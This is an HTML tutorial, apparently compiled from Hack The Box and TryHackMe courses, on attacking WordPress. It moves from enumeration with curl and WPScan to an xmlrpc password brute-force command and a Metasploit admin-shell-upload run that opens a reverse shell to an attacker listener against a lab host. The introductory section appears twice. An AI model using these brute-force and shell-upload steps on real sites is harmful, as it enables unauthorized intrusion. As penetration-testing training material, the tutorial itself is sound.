@@ -1,0 +1,238 @@
+<html><head><style>body {
+   color: black;
+}
+</style></head><body><h1 id="-wordpress-structure-">🔥Wordpress Structure 🔥</h1>
+<p>WordPress can be installed on a Windows, Linux, or Mac OSX host. For this module, we will focus on a default WordPress installation on an Ubuntu Linux web server. WordPress requires a fully installed and configured LAMP stack (Linux operating system, Apache HTTP Server, MySQL database, and the PHP programming language) before installation on a Linux host. After installation, all WordPress supporting files and directories will be accessible in the webroot located at /var/www/html.</p>
+<p>Below is the directory structure of a default WordPress install, showing the key files and subdirectories necessary for the website to function properly.</p>
+<pre><code> tree -L <span class="hljs-number">1</span> /var/www/<span class="hljs-selector-tag">html</span>
+
+ ├── index<span class="hljs-selector-class">.php</span>
+ ├── license<span class="hljs-selector-class">.txt</span>
+ ├── readme<span class="hljs-selector-class">.html</span>
+ ├── wp-activate<span class="hljs-selector-class">.php</span>
+ ├── wp-admin
+ ├── wp-blog-<span class="hljs-selector-tag">header</span><span class="hljs-selector-class">.php</span>
+ ├── wp-comments-post<span class="hljs-selector-class">.php</span>
+ ├── wp-config<span class="hljs-selector-class">.php</span>
+ ├── wp-config-sample<span class="hljs-selector-class">.php</span>
+ ├── wp-<span class="hljs-attribute">content</span>
+ ├── wp-cron<span class="hljs-selector-class">.php</span>
+ ├── wp-includes
+ ├── wp-links-opml<span class="hljs-selector-class">.php</span>
+ ├── wp-load<span class="hljs-selector-class">.php</span>
+ ├── wp-login<span class="hljs-selector-class">.php</span>
+ ├── wp-mail<span class="hljs-selector-class">.php</span>
+ ├── wp-settings<span class="hljs-selector-class">.php</span>
+ ├── wp-signup<span class="hljs-selector-class">.php</span>
+ ├── wp-trackback<span class="hljs-selector-class">.php</span>
+ └── xmlrpc.php
+</code></pre><h2 id="key-wordpress-files">Key WordPress Files</h2>
+<p>The root directory of WordPress contains files that are needed to configure WordPress to function correctly.</p>
+<pre><code>index.php is <span class="hljs-keyword">the</span> homepage <span class="hljs-keyword">of</span> WordPress.
+
+license.txt <span class="hljs-keyword">contains</span> useful information such <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">version</span> WordPress installed.
+
+wp-activate.php is used <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> email activation <span class="hljs-built_in">process</span> when setting up <span class="hljs-keyword">a</span> <span class="hljs-built_in">new</span> WordPress site.
+
+wp-admin <span class="hljs-built_in">folder</span> <span class="hljs-keyword">contains</span> <span class="hljs-keyword">the</span> login page <span class="hljs-keyword">for</span> administrator access <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span> backend dashboard. Once <span class="hljs-keyword">a</span> user has logged <span class="hljs-keyword">in</span>, they can make changes <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> site based <span class="hljs-keyword">on</span> <span class="hljs-title">their</span> <span class="hljs-title">assigned</span> <span class="hljs-title">permissions</span>. <span class="hljs-title">The</span> <span class="hljs-title">login</span> <span class="hljs-title">page</span> <span class="hljs-title">can</span> <span class="hljs-title">be</span> <span class="hljs-title">located</span> <span class="hljs-title">at</span> <span class="hljs-title">one</span> <span class="hljs-title">of</span> <span class="hljs-title">the</span> <span class="hljs-title">following</span> <span class="hljs-title">paths</span>:
+/wp-admin/login.php
+/wp-admin/wp-login.php
+/login.php
+/wp-login.php
+</code></pre><p>This file can also be renamed to make it more challenging to find the login page.</p>
+<pre><code>xmlrpc.php is <span class="hljs-keyword">a</span> <span class="hljs-built_in">file</span> representing <span class="hljs-keyword">a</span> feature <span class="hljs-keyword">of</span> WordPress that enables data <span class="hljs-built_in">to</span> be transmitted <span class="hljs-keyword">with</span> HTTP acting <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> transport mechanism <span class="hljs-keyword">and</span> XML <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> encoding mechanism. This type <span class="hljs-keyword">of</span> communication has been replaced <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> WordPress REST API.
+</code></pre><h1 id="-hacking-wordpress-">🔥Hacking-Wordpress 🔥</h1>
+<p><img src="https://user-images.githubusercontent.com/79256105/165776319-f7d73fb8-6bd9-4847-97da-461b641fbfe0.png" alt="wordpress-hacking"></p>
+<h1 id="basic-wordpress-and-wordpress-structure">Basic Wordpress and Wordpress Structure</h1>
+<h3 id="-wordpress-structure-">🔥Wordpress Structure 🔥</h3>
+<p>WordPress can be installed on a Windows, Linux, or Mac OSX host. For this module, we will focus on a default WordPress installation on an Ubuntu Linux web server. WordPress requires a fully installed and configured LAMP stack (Linux operating system, Apache HTTP Server, MySQL database, and the PHP programming language) before installation on a Linux host. After installation, all WordPress supporting files and directories will be accessible in the webroot located at /var/www/html.</p>
+<p>Below is the directory structure of a default WordPress install, showing the key files and subdirectories necessary for the website to function properly.</p>
+<pre><code> tree -L <span class="hljs-number">1</span> /var/www/<span class="hljs-selector-tag">html</span>
+
+ ├── index<span class="hljs-selector-class">.php</span>
+ ├── license<span class="hljs-selector-class">.txt</span>
+ ├── readme<span class="hljs-selector-class">.html</span>
+ ├── wp-activate<span class="hljs-selector-class">.php</span>
+ ├── wp-admin
+ ├── wp-blog-<span class="hljs-selector-tag">header</span><span class="hljs-selector-class">.php</span>
+ ├── wp-comments-post<span class="hljs-selector-class">.php</span>
+ ├── wp-config<span class="hljs-selector-class">.php</span>
+ ├── wp-config-sample<span class="hljs-selector-class">.php</span>
+ ├── wp-<span class="hljs-attribute">content</span>
+ ├── wp-cron<span class="hljs-selector-class">.php</span>
+ ├── wp-includes
+ ├── wp-links-opml<span class="hljs-selector-class">.php</span>
+ ├── wp-load<span class="hljs-selector-class">.php</span>
+ ├── wp-login<span class="hljs-selector-class">.php</span>
+ ├── wp-mail<span class="hljs-selector-class">.php</span>
+ ├── wp-settings<span class="hljs-selector-class">.php</span>
+ ├── wp-signup<span class="hljs-selector-class">.php</span>
+ ├── wp-trackback<span class="hljs-selector-class">.php</span>
+ └── xmlrpc.php
+</code></pre><h2 id="-key-wordpress-files-">👽 Key WordPress Files ♀️</h2>
+<p>The root directory of WordPress contains files that are needed to configure WordPress to function correctly.</p>
+<pre><code>index.php is <span class="hljs-keyword">the</span> homepage <span class="hljs-keyword">of</span> WordPress.
+
+license.txt <span class="hljs-keyword">contains</span> useful information such <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">version</span> WordPress installed.
+
+wp-activate.php is used <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> email activation <span class="hljs-built_in">process</span> when setting up <span class="hljs-keyword">a</span> <span class="hljs-built_in">new</span> WordPress site.
+
+wp-admin <span class="hljs-built_in">folder</span> <span class="hljs-keyword">contains</span> <span class="hljs-keyword">the</span> login page <span class="hljs-keyword">for</span> administrator access <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span> backend dashboard. Once <span class="hljs-keyword">a</span> user has logged <span class="hljs-keyword">in</span>, they can make changes <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> site based <span class="hljs-keyword">on</span> <span class="hljs-title">their</span> <span class="hljs-title">assigned</span> <span class="hljs-title">permissions</span>. <span class="hljs-title">The</span> <span class="hljs-title">login</span> <span class="hljs-title">page</span> <span class="hljs-title">can</span> <span class="hljs-title">be</span> <span class="hljs-title">located</span> <span class="hljs-title">at</span> <span class="hljs-title">one</span> <span class="hljs-title">of</span> <span class="hljs-title">the</span> <span class="hljs-title">following</span> <span class="hljs-title">paths</span>:
+/wp-admin/login.php
+/wp-admin/wp-login.php
+/login.php
+/wp-login.php
+</code></pre><p>This file can also be renamed to make it more challenging to find the login page.</p>
+<pre><code>xmlrpc.php is <span class="hljs-keyword">a</span> <span class="hljs-built_in">file</span> representing <span class="hljs-keyword">a</span> feature <span class="hljs-keyword">of</span> WordPress that enables data <span class="hljs-built_in">to</span> be transmitted <span class="hljs-keyword">with</span> HTTP acting <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> transport mechanism <span class="hljs-keyword">and</span> XML <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> encoding mechanism. This type <span class="hljs-keyword">of</span> communication has been replaced <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> WordPress REST API.
+</code></pre><p>WordPress Configuration File</p>
+<h2 id="wordpress-configuration-file">WordPress Configuration File</h2>
+<pre><code>The wp-config.php <span class="hljs-built_in">file</span> <span class="hljs-keyword">contains</span> information required <span class="hljs-keyword">by</span> WordPress <span class="hljs-built_in">to</span> connect <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> database, such <span class="hljs-keyword">as</span> <span class="hljs-keyword">the</span> database name, database host, username <span class="hljs-keyword">and</span> password, authentication <span class="hljs-built_in">keys</span> <span class="hljs-keyword">and</span> salts, <span class="hljs-keyword">and</span> <span class="hljs-keyword">the</span> database table prefix. This configuration <span class="hljs-built_in">file</span> can also be used <span class="hljs-built_in">to</span> activate DEBUG mode, which can useful <span class="hljs-keyword">in</span> troubleshooting.
+</code></pre><p>wp-config.php</p>
+<pre><code><span class="hljs-attribute">Code</span>: php
+
+<span class="lasso">&lt;?php
+<span class="hljs-comment">/** &lt;SNIP&gt; */</span>
+<span class="hljs-comment">/** The name of the database for WordPress */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'DB_NAME'</span>, <span class="hljs-string">'database_name_here'</span> );
+
+<span class="hljs-comment">/** MySQL database username */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'DB_USER'</span>, <span class="hljs-string">'username_here'</span> );
+
+<span class="hljs-comment">/** MySQL database password */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'DB_PASSWORD'</span>, <span class="hljs-string">'password_here'</span> );
+
+<span class="hljs-comment">/** MySQL hostname */</span>
+ <span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'DB_HOST'</span>, <span class="hljs-string">'localhost'</span> );
+
+ <span class="hljs-comment">/** Authentication Unique Keys and Salts */</span>
+  <span class="hljs-comment">/* &lt;SNIP&gt; */</span>
+ <span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'AUTH_KEY'</span>,         <span class="hljs-string">'put your unique phrase here'</span> );
+ <span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'SECURE_AUTH_KEY'</span>,  <span class="hljs-string">'put your unique phrase here'</span> );
+ <span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'LOGGED_IN_KEY'</span>,    <span class="hljs-string">'put your unique phrase here'</span> );
+ <span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'NONCE_KEY'</span>,        <span class="hljs-string">'put your unique phrase here'</span> );
+ <span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'AUTH_SALT'</span>,        <span class="hljs-string">'put your unique phrase here'</span> );
+ <span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'SECURE_AUTH_SALT'</span>, <span class="hljs-string">'put your unique phrase here'</span> );
+ <span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'LOGGED_IN_SALT'</span>,   <span class="hljs-string">'put your unique phrase here'</span> );
+ <span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'NONCE_SALT'</span>,       <span class="hljs-string">'put your unique phrase here'</span> );
+
+ <span class="hljs-comment">/** WordPress Database Table prefix */</span>
+ $table_prefix = <span class="hljs-string">'wp_'</span>;
+
+ <span class="hljs-comment">/** For developers: WordPress debugging mode. */</span>
+<span class="hljs-comment">/** &lt;SNIP&gt; */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'WP_DEBUG'</span>, <span class="hljs-literal">false</span> );
+
+<span class="hljs-comment">/** Absolute path to the WordPress directory. */</span>
+ <span class="hljs-keyword">if</span> ( ! defined( <span class="hljs-string">'ABSPATH'</span> ) ) {
+ <span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'ABSPATH'</span>, __DIR__ . <span class="hljs-string">'/'</span> );
+}
+
+<span class="hljs-comment">/** Sets up WordPress vars and included files. */</span>
+require_once ABSPATH . <span class="hljs-string">'wp-settings.php'</span>;</span>
+</code></pre><h1 id="key-wordpress-directories">Key WordPress Directories</h1>
+<p>The wp-content folder is the main directory where plugins and themes are stored. The subdirectory uploads/ is usually where any files uploaded to the platform are stored. These directories and files should be carefully enumerated as they may lead to contain sensitive data that could lead to remote code execution or exploitation of other vulnerabilities or misconfigurations.</p>
+<h4 id="wp-content">WP-Content</h4>
+<pre><code>tree -L <span class="hljs-number">1</span> /var/www/html/wp-<span class="hljs-attribute">content</span>
+
+├── index<span class="hljs-selector-class">.php</span>
+├── plugins
+└── themes
+</code></pre><h4 id="wp-includes">WP-Includes</h4>
+<p>wp-includes contains everything except for the administrative components and the themes that belong to the website. This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.</p>
+<pre><code> tree -L <span class="hljs-number">1</span> /var/www/html/wp-includes
+
+ ├── theme<span class="hljs-selector-class">.php</span>
+ ├── update<span class="hljs-selector-class">.php</span>
+ ├── user<span class="hljs-selector-class">.php</span>
+ ├── vars<span class="hljs-selector-class">.php</span>
+ ├── version<span class="hljs-selector-class">.php</span>
+ ├── widgets
+ ├── widgets<span class="hljs-selector-class">.php</span>
+ ├── wlwmanifest<span class="hljs-selector-class">.xml</span>
+ ├── wp-db<span class="hljs-selector-class">.php</span>
+ └── wp-diff.php
+</code></pre><h1 id="wordpress-user-roles">WordPress User Roles</h1>
+<p>There are five types of users in a standard WordPress installation.</p>
+<pre><code> Role               Description
+ Administrator     This user has access <span class="hljs-built_in">to</span> administrative features <span class="hljs-keyword">within</span> <span class="hljs-keyword">the</span> website. This includes adding <span class="hljs-keyword">and</span> deleting users <span class="hljs-keyword">and</span> posts, <span class="hljs-keyword">as</span> well <span class="hljs-keyword">as</span>                         editing source code.
+ Editor          An editor can publish <span class="hljs-keyword">and</span> manage posts, including <span class="hljs-keyword">the</span> posts <span class="hljs-keyword">of</span> other users.
+ Author          Authors can publish <span class="hljs-keyword">and</span> manage their own posts.
+ Contributor     These users can <span class="hljs-built_in">write</span> <span class="hljs-keyword">and</span> manage their own posts but cannot publish them.
+ Subscriber     These are <span class="hljs-keyword">normal</span> users who can browse posts <span class="hljs-keyword">and</span> edit their profiles.
+</code></pre><p>Gaining access as an administrator is usually needed to obtain code execution on the server. However, editors and authors might have access to certain vulnerable plugins that normal users do not.</p>
+<h1 id="-enumeration-procedure-for-wordpress-website-in-manually">🥇Enumeration Procedure For Wordpress Website in Manually</h1>
+<h3 id="wordpress-version-check">Wordpress Version Check</h3>
+<p>Check Wordpress Version using given below curl command or seeing source code</p>
+<pre><code><span class="hljs-string">commnad:</span>
+        curl -s -X GET <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.com | grep '&lt;meta name="generator"'</span>
+</code></pre><p> Also check WP Version - CSS and WP Version - JS version from Source Code </p>
+<h3 id="-plugins-and-themes-enumeration">▶️ Plugins and Themes Enumeration</h3>
+<p>Commnad For Plugins: </p>
+<pre><code>  curl <span class="hljs-_">-s</span> -X GET http://blog.inlanefreight.com | sed <span class="hljs-string">'s/href=/\n/g'</span> | sed <span class="hljs-string">'s/src=/\n/g'</span> | grep <span class="hljs-string">'wp-content/plugins/*'</span> | cut <span class="hljs-_">-d</span><span class="hljs-string">"'"</span> <span class="hljs-_">-f</span>2
+</code></pre><p>Command For Themmes:</p>
+<pre><code>  curl <span class="hljs-_">-s</span> -X GET http://blog.inlanefreight.com | sed <span class="hljs-string">'s/href=/\n/g'</span> | sed <span class="hljs-string">'s/src=/\n/g'</span> | grep <span class="hljs-string">'themes'</span> | cut <span class="hljs-_">-d</span><span class="hljs-string">"'"</span> <span class="hljs-_">-f</span>2
+</code></pre><h4 id="-user-enumeration">⏩ User Enumeration</h4>
+<p>Enumerating a list of valid users is a critical phase of a WordPress security assessment. Armed with this list, we may be able to guess default credentials or perform a brute force password attack. If successful, we may be able to log in to the WordPress backend as an author or even as an administrator. This access can potentially be leveraged to modify the WordPress website or even interact with the underlying web server.</p>
+<p>Command :</p>
+<pre><code>    curl http:<span class="hljs-regexp">//</span>blog.inlanefreight.com<span class="hljs-regexp">/wp-json/</span>wp<span class="hljs-regexp">/v2/u</span>sers
+</code></pre><h1 id="-enumeration-procedure-for-wordpress-website-in-automatically-using-wpscan">⤵️Enumeration Procedure For Wordpress Website in Automatically Using wpscan</h1>
+<p>WPScan is an automated WordPress scanner and enumeration tool. It determines if the various themes and plugins used by a WordPress site are outdated or vulnerable. It is installed by default on Parrot OS ,Kali OS but can also be installed manually with gem
+         gem install wpscan
+Once the installation completes, we can issue a command such as <strong><em>wpscan</em></strong> --hh to verify the installation. This command will show us the usage menu with all of the available command-line switches available.</p>
+<h3 id="-enumerating-a-website-with-wpscan-">🔥Enumerating a Website with WPScan ⚛️</h3>
+<p>The --enumerate flag is used to enumerate various components of the WordPress application such as plugins, themes, and users. By default, <strong><em>WPScan enumerates vulnerable plugins, themes, users, media, and backups</em></strong>. However, specific arguments can be supplied to restrict enumeration to specific components. For example, all plugins can be enumerated using the arguments --enumerate ap. Let&#39;s run a normal enumeration scan against a WordPress website.
+Command :</p>
+<pre><code>        <span class="hljs-comment">wpscan</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">url</span> <span class="hljs-comment">http://blog</span><span class="hljs-string">.</span><span class="hljs-comment">inlanefreight</span><span class="hljs-string">.</span><span class="hljs-comment">com</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">enumerate</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">api</span><span class="hljs-literal">-</span><span class="hljs-comment">token</span> <span class="hljs-comment">api</span><span class="hljs-literal">-</span><span class="hljs-comment">token</span><span class="hljs-literal">-</span><span class="hljs-comment">value</span>
+</code></pre><p>Example :</p>
+<pre><code>        <span class="hljs-comment">wpscan</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">url</span> <span class="hljs-comment">http://10</span><span class="hljs-string">.</span><span class="hljs-comment">129</span><span class="hljs-string">.</span><span class="hljs-comment">2</span><span class="hljs-string">.</span><span class="hljs-comment">37/</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">enumerate</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">api</span><span class="hljs-literal">-</span><span class="hljs-comment">token</span> <span class="hljs-comment">cs0QRHwsYE6RvLd6SaHDhI1dmNX8ZVLEx0Fb7mNid9s</span>
+</code></pre><h5 id="-note-api-token-generator-link-https-wpscan-com-">👀Note: Api Token Generator Link <a href="https://wpscan.com/">https://wpscan.com/</a></h5>
+<h1 id="-exploiting-a-vulnerable-plugin">✔️ Exploiting a Vulnerable Plugin</h1>
+<p>If we are checking and testing properly of our target wordpress website and if  target wordpress website is vulneable we will see some CVE or Exploite information after using above wpscan command</p>
+<h3 id="-wordpress-user-bruteforce">☑️WordPress User Bruteforce</h3>
+<p>WPScan can be used to brute force usernames and passwords. The tool uses two kinds of login brute force attacks, xmlrpc and wp-login. The wp-login method will attempt to brute force the normal WordPress login page, while the xmlrpc method uses the WordPress API to make login attempts through /xmlrpc.php. The xmlrpc method is preferred as it is faster.</p>
+<p>Command :</p>
+<pre><code>      wpscan --password-attack xmlrpc -t <span class="hljs-number">20</span> -U admin, david -P passwords<span class="hljs-selector-class">.txt</span> --url http:<span class="hljs-comment">//blog.inlanefreight.com</span>
+</code></pre><h4 id="-note-use-username-and-password-in-http-sitename-login-path">👁️Note: use username and password in <a href="http://sitename/login">http://sitename/login</a> path</h4>
+<h1 id="-remote-code-execution-rce-via-the-theme-editor-">🔥Remote Code Execution (RCE) via the Theme Editor 🔥</h1>
+<p>With administrative access to WordPress, we can modify the PHP source code to execute system commands. To perform this attack, log in to WordPress with the administrator credentials, which should redirect us to the admin panel. Click on Appearance on the side panel and select Theme Editor. This page will allow us to edit the PHP source code directly. We should select an inactive theme in order to avoid corrupting the main theme.</p>
+<h1 id="-attacking-wordpress-with-metasploit-">🔥Attacking WordPress with Metasploit 🔥</h1>
+<p>We can use the Metasploit Framework (MSF) to obtain a reverse shell on the target automatically. This requires valid credentials for an account that has sufficient rights to create files on the webserver.</p>
+<h6 id="to-obtain-the-reverse-shell-we-can-use-the-wp_admin_shell_upload-module-we-can-easily-search-for-it-inside-msf-">To obtain the reverse shell, we can use the wp_admin_shell_upload module. We can easily search for it inside MSF:</h6>
+<pre><code>    msf5 &gt; <span class="hljs-built_in">search</span> wp_admin
+</code></pre><h6 id="matching-modules">Matching Modules</h6>
+<p>0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload</p>
+<h6 id="module-selection-">Module Selection:</h6>
+<p>msf5 &gt; use 0</p>
+<p>msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt;</p>
+<h6 id="module-options">Module Options</h6>
+<pre><code>    msf5 exploit(unix<span class="hljs-regexp">/webapp/</span>wp_admin_shell_upload) &gt; <span class="hljs-keyword">options</span>
+</code></pre><h5 id="module-options-exploit-unix-webapp-wp_admin_shell_upload-">Module options (exploit/unix/webapp/wp_admin_shell_upload):</h5>
+<pre><code>   PASSWORD                    <span class="hljs-literal">yes</span>       The WordPress password <span class="hljs-keyword">to</span> authenticate <span class="hljs-keyword">with</span>
+   Proxies                     <span class="hljs-literal">no</span>        A proxy chain <span class="hljs-keyword">of</span> format type:host:port[,type:host:port][...]
+   RHOSTS                      <span class="hljs-literal">yes</span>       The target host(s), range CIDR identifier, <span class="hljs-keyword">or</span> hosts file <span class="hljs-keyword">with</span> syntax <span class="hljs-string">'file:&lt;path&gt;'</span>
+   RPORT      <span class="hljs-number">80</span>               <span class="hljs-literal">yes</span>       The target port (TCP)
+   SSL        <span class="hljs-literal">false</span>            <span class="hljs-literal">no</span>        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections
+   TARGETURI  /                <span class="hljs-literal">yes</span>       The base path <span class="hljs-keyword">to</span> the wordpress application
+   USERNAME                    <span class="hljs-literal">yes</span>       The WordPress username <span class="hljs-keyword">to</span> authenticate <span class="hljs-keyword">with</span>
+   VHOST                       <span class="hljs-literal">no</span>        HTTP server virtual host
+</code></pre><p>Exploit target:</p>
+<pre><code>   <span class="hljs-comment">Id</span>  <span class="hljs-comment">Name</span>
+   <span class="hljs-literal">-</span><span class="hljs-literal">-</span>  <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
+   <span class="hljs-comment">0</span>   <span class="hljs-comment">WordPress</span>
+</code></pre><h4 id="set-and-exploitation">set and Exploitation</h4>
+<pre><code>msf5 exploit(unix/webapp/wp_admin_shell_upload) &gt; <span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">blog.inlanefreight.com</span>
+msf5 <span class="hljs-comment">exploit(unix</span>/webapp/<span class="hljs-comment">wp_admin_shell_upload) &gt; set username admin</span>
+msf5 <span class="hljs-comment">exploit(unix</span>/webapp/<span class="hljs-comment">wp_admin_shell_upload) &gt; set password Winter2020</span>
+msf5 <span class="hljs-comment">exploit(unix</span>/webapp/<span class="hljs-comment">wp_admin_shell_upload) &gt; set lhost 10.10.16.8</span>
+msf5 <span class="hljs-comment">exploit(unix</span>/webapp/<span class="hljs-comment">wp_admin_shell_upload) &gt; run</span>
+</code></pre><p>meterpreter &gt; getuid
+Server username: www—data (33)</p>
+<h2 id="-practicing-sites-">🙏Practicing Sites:</h2>
+<pre><code>              https:<span class="hljs-regexp">//</span>tryhackme.com<span class="hljs-regexp">/room/</span>allinonemj
+              https:<span class="hljs-regexp">//</span>tryhackme.com<span class="hljs-regexp">/room/</span>wordpresscve202129447
+              https:<span class="hljs-regexp">//</span>tryhackme.com<span class="hljs-regexp">/room/</span>blog
+</code></pre><h2 id="-website-security-testing-site-">🎆 Website Security Testing Site:</h2>
+<pre><code><span class="hljs-symbol">                               https:</span><span class="hljs-comment">//sitecheck.sucuri.net/</span>
+</code></pre><h2 id="-happy-hackings-">💠 Happy Hackings 🔡</h2>
+<h2 id="-source-hack-the-box-accademy-and-try-hack-me-">ℹ️  Source: Hack The Box Accademy and Try Hack Me 🔽</h2>
+</body></html>
